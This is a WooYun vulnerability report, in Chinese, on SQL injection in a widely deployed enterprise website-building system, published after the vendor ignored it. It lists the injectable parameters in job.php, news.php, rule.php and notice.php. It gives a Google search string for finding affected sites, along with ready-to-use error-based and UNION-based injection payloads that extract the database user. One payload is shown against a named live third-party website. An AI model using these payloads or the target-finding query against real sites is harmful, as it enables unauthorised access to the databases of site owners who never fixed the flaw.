wybug_title: 某企业建站系统通用性注入
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-11-17：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-02-15：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT~ 详细说明：  前人发过。 WooYun: 某通用型企业建站系统SQL注入，影响网站数量过于惊人 官网：www.shandongweb.com/ 影响不算小漏洞文件job.php?mode=detail&id=  （主要是job.php这个文件）notice.php?act=detail&id= news.php?act=detail&id= rule.php?act=detail&id=google hacking技术支持:科创互联inurl:job.phpexp：爆用户：news.php?act=detail&id=692%20AND%20(SELECT%203703%20FROM(SELECT%20COUNT(*),CONCAT(0x3a656a743a,(MID((IFNULL(CAST(CURRENT_USER()%20AS%20CHAR),0x20)),1,50)),0x3a6164613a,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)rule.php?act=detail&id=692%20AND%20(SELECT%203703%20FROM(SELECT%20COUNT(*),CONCAT(0x3a656a743a,(MID((IFNULL(CAST(CURRENT_USER()%20AS%20CHAR),0x20)),1,50)),0x3a6164613a,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)爆数据库：job.php?mode=detail&id=-7684 UNION ALL SELECT NULL,CONCAT(0x3a6269743a,IFNULL(CAST(CURRENT_USER() AS CHAR),0x20),0x3a68656d3a),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#   漏洞证明：  列出几个案例吧：http://www.xdl-china.com/news.php?act=detail&id=692%20AND%20(SELECT%203703%20FROM(SELECT%20COUNT(*),CONCAT(0x3a656a743a,(MID((IFNULL(CAST(CURRENT_USER()%20AS%20CHAR),0x20)),1,50)),0x3a6164613a,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)
